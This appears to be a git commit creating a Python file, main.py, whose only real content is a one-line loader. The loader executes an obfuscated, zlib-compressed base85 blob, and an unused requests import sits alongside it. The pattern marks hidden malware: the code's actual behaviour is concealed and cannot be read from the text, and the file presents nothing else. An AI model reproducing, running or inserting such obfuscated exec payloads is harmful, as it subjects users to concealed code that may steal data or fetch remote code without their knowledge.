a86a370b03354ecb7bae5deac18b8bc229fcdd13
JJTChannel <95204359+JJTChannel@users.noreply.github.com>
2023-03-03 12:28:10 +0700

    Create main.py

---
+++ main.py
@@ -0,0 +1,5 @@
+import requests
+from colorama import Fore
+import os
+
+import zlib,base64;exec(zlib.decompress(base64.b85decode('c$}S8OHbo45Wf3Ym|U7jsJ%z(p+G2=vPI${=xG&-3F%@xYdcyH%AF%fEi0|mKgTawr*RYK;XaUj$b2*Y#-C@LiEvDrfDHXk5EmRgFpA-nK2a9n07kj@lrjX=H{}4tEF!|T{PV%dXgoZy8~`Zq@)s@;wyo(C&yc%-5X4{~o?4dmno)H9(eUi*!aMot-KOB{^P{@nvbFeY#^2gk;VSp)ra8Xd)!4F$rww1ZK(1JdO$~xRjQHZ;*Wx`}3YjZ&vCLd`(en(iM{4mVsv6QlyAfaWD4`S2_s?(k*Sa~fkXs6^g6&PSmAo*UmD8@X!LPIqFFbFY8k(-z$h%1`($}^Z6|B_ayHdB8by<;mJQ+x(EjK=|bYrtfTaGtxZ|1$IjM;ZCw*FF&{A(|*U$}N5M!e!(8j-@R^Xx!n%DzVm?WyX2;Tv@KNa-(l83!24zxB}zd=w()Zm)MA@hN5Z-7xHx|FT)-wa@hTAheEo*6x%yvx<_CRtT9+h~(T*qb8pv4)~*v+lLW}6FGv`=XaqTIhco~=Lh0E2vP1y_-Ya<*R`}rfR!)6G$CT;6}E~P<d{7gUpdgV90xp51|t~)SwKQ$=bIcCz+!ZEW6FiCPIw4soRa=)XG)1cM08vzPj}c!RBCCjKU3#FMjlB$')).decode())
